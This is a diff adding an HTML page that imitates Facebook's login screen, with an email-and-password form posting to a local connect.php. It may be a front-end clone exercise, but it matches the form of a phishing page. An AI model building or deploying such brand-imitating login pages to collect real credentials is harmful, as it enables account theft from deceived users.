@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+
+
+</head>
+
+<body>
+<div class="makeformcenter">
+        <form action="connect.php" onsubmit="return login()" method="POST" class="form" >
+           
+            <input  id="email" class="user" type="text"  name="email" placeholder="Email or phone number" >
+            <br>
+            <input id="password" class="password" type="password" name="password" placeholder="Password">
+            <br>
+            <button  class="Login"  type="submit" name="LogIn" value="LogIn">Log In</button><br>
+            <div class="forgot">
+                <u> forgot password? </u><br>
+            </div>
+
+            <div class="line" ></div>
+            
+            
+            <button  class="create" type="submit" name="create" value="create">Create new account</button>
+        
+        </form>
+    </div>       
+
+        <div class="margin-content" >
+            <h1 class="h1" id="face" > facebook</h1>
+           
+        </div>
+
+        <div class="p">
+            <p1 >Connect with friends and the world</p1><br>
+        </div>
+        <p2 class="p2" >around you on facebook</p2>
+
+    <script src="facebook.js"> </script>
+
+</body>
+
+</html>
